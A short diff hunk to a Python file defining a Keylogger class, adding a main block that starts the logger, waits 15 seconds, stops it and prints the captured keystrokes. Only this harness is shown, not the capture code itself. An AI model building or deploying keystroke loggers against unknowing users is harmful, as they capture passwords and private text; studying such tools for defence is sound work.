@@ -63,3 +63,10 @@ class Keylogger:
         self.__lock.release()
         return keylog
 
+
+if __name__ == "__main__":
+    k = Keylogger()
+    k.start()
+    time.sleep(15)
+    k.stop()
+    print(k.get_keylog())
